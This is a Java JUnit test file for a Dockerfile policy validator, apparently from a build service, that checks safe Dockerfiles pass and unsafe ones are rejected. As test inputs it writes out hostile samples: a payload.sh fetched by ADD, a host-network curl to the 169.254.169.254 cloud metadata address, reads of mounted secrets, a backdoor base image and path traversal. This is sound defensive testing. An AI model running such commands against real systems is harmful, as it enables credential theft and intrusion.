package com.cloudforge.worker.oci;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DockerfilePolicyValidatorTest {

    @TempDir
    Path tempDir;

    @Test
    void acceptsValidMinimalAndMultiStageDockerfiles() throws Exception {
        Files.writeString(tempDir.resolve("app.txt"), "hello-cloudforge\n", StandardCharsets.UTF_8);
        Files.writeString(tempDir.resolve("Dockerfile"), """
                # syntax=docker/dockerfile:1
                FROM alpine:3.20 AS builder
                WORKDIR /work
                COPY app.txt /work/app.txt
                RUN echo "build ok" > /work/built.txt

                FROM scratch
                COPY --from=builder /work/built.txt /built.txt
                ENTRYPOINT ["/built.txt"]
                """, StandardCharsets.UTF_8);

        DockerfilePolicyValidator.ValidatedContext validated = DockerfilePolicyValidator.validate(
                tempDir, ".", "Dockerfile", Set.of()
        );
        assertThat(validated.contextFileCount()).isGreaterThanOrEqualTo(2);
        assertThat(validated.baseImages()).containsExactly("alpine:3.20", "scratch");
    }

    @Test
    void acceptsSubdirectoryContextAndExtraAllowlistedBaseImage() throws Exception {
        Path serviceDir = Files.createDirectories(tempDir.resolve("services/api"));
        Files.writeString(serviceDir.resolve("index.txt"), "ok", StandardCharsets.UTF_8);
        Files.writeString(serviceDir.resolve("Dockerfile.prod"), """
                FROM cgr.dev/chainguard/static:latest
                COPY index.txt /index.txt
                """, StandardCharsets.UTF_8);

        DockerfilePolicyValidator.ValidatedContext validated = DockerfilePolicyValidator.validate(
                tempDir,
                "services/api",
                "services/api/Dockerfile.prod",
                Set.of("cgr.dev/chainguard/static:latest")
        );
        assertThat(validated.contextDirectory()).isEqualTo(serviceDir.toAbsolutePath().normalize());
        assertThat(validated.baseImages()).containsExactly("cgr.dev/chainguard/static:latest");
    }

    @Test
    void rejectsPathTraversalAbsolutePathsAndRemoteUris() throws Exception {
        Files.writeString(tempDir.resolve("Dockerfile"), "FROM scratch\n", StandardCharsets.UTF_8);

        assertThatThrownBy(() -> DockerfilePolicyValidator.validate(tempDir, "../escape", "Dockerfile", Set.of()))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("traversal");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validate(tempDir, "/etc", "Dockerfile", Set.of()))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Unsafe buildContextPath");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validate(tempDir, ".", "https://evil.example/Dockerfile", Set.of()))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Unsafe dockerfilePath");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validate(tempDir, ".", ".git/config", Set.of()))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class);
    }

    @Test
    void rejectsUntrustedSyntaxUntrustedBaseImagesDynamicFromAndDangerousDirectives() {
        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "# syntax=evil.registry.io/custom/frontend:latest\nFROM scratch\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("#syntax");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM evil.example.com/backdoor:latest\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("trusted CloudForge base image allowlist");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "ARG BASE=alpine:3.20\nFROM ${BASE}\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Dynamic");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nADD https://example.com/payload.sh /payload.sh\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Remote URL in Dockerfile ADD");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nRUN --security=insecure id\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Privileged, host-network, SSH, or secret mount");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nRUN --network=host curl http://169.254.169.254\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Privileged, host-network, SSH, or secret mount");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nRUN --mount=type=secret,id=reg cat /run/secrets/reg\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Privileged, host-network, SSH, or secret mount");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nRUN --mount=type=ssh git clone git@github.com:org/repo\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Privileged, host-network, SSH, or secret mount");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nCOPY --from=untrusted-external:1 /bin/sh /sh\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("COPY --from external image");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nONBUILD RUN echo pwn\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("ONBUILD");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nVOLUME /host-data\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("VOLUME");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nARG REGISTRY_PASSWORD\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Secret-like");

        assertThatThrownBy(() -> DockerfilePolicyValidator.validateDockerfileContent(
                "FROM alpine:3.20\nENV API_TOKEN=hardcoded\n",
                DockerfilePolicyValidator.DEFAULT_ALLOWED_BASE_IMAGES))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("Secret-like");
    }

    @Test
    void rejectsOversizedOrEmptyDockerfile() throws Exception {
        Files.writeString(tempDir.resolve("Dockerfile"), "", StandardCharsets.UTF_8);
        assertThatThrownBy(() -> DockerfilePolicyValidator.validate(tempDir, ".", "Dockerfile", Set.of()))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("size");

        String oversized = "FROM scratch\n" + "#".repeat((int) DockerfilePolicyValidator.MAX_DOCKERFILE_BYTES + 100);
        Files.writeString(tempDir.resolve("Dockerfile"), oversized, StandardCharsets.UTF_8);
        assertThatThrownBy(() -> DockerfilePolicyValidator.validate(tempDir, ".", "Dockerfile", Set.of()))
                .isInstanceOf(DockerfilePolicyValidator.PolicyViolationException.class)
                .hasMessageContaining("size");
    }
}
